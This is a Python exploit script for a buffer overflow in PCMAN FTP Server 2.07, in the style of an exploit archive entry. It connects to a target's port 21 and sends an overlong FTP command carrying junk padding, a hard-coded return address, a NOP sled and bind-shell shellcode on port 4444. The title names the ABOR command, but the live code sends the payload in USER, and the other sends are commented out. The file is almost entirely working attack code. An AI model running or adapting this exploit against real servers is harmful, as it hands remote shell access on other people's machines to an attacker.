# Exploit Title: PCMAN FTP 2.07 ABOR Command Buffer Overflow
# Date: Jan 25,2014
# Exploit Author: Mahmod Mahajna (Mahy)
# Version: 2.07
# Tested on: Windows 7 sp1 x64 (english)
# Email: m.dofo123@gmail.com
import socket as s
from sys import argv
#
if(len(argv) != 4):
    print "USAGE: %s host <user> <password>" % argv[0]
    exit(1)
else:
    #store command line arguments
    script,host,fuser,fpass=argv
    #vars
    junk = '\x41' * 2000 #overwrite function (ABOR) with garbage/junk chars
    #junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2C"
    espaddress = '\xd8\xfc\x93\x7c' # 0x7c93fcd8
    nops = '\x90' * 10
    shellcode = ( # BIND SHELL | PORT 4444
        "\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"
        "\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"
        "\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"
        "\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"
        "\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"
        "\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"
        "\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"
        "\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"
        "\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"
        "\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"
        "\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"
        "\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"
        "\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"
        "\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"
        "\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"
        "\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"
        "\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"
        "\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"
        "\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"
        "\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"
        "\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"
        "\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"
        "\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"
        "\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"
        "\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a\xcd")
    sploit = junk+espaddress+nops+shellcode
    #sploit = "A" * 2008    
	#create socket
    conn = s.socket(s.AF_INET,s.SOCK_STREAM)
    #establish connection to server
    conn.connect((host,21))
    #post ftp user
    conn.send('USER '+sploit+'\r\n')
    
    #wait for response
    uf = conn.recv(1024)
    #post ftp password
    #conn.send('PASS '+sploit+'\r\n')
    #wait for response
    #pf = conn.recv(1024)
    #send ftp command with sploit
    #conn.send('ABOR '+sploit+'\r\n')
    #cf = conn.recv(1024)
    #close connection
    conn.close()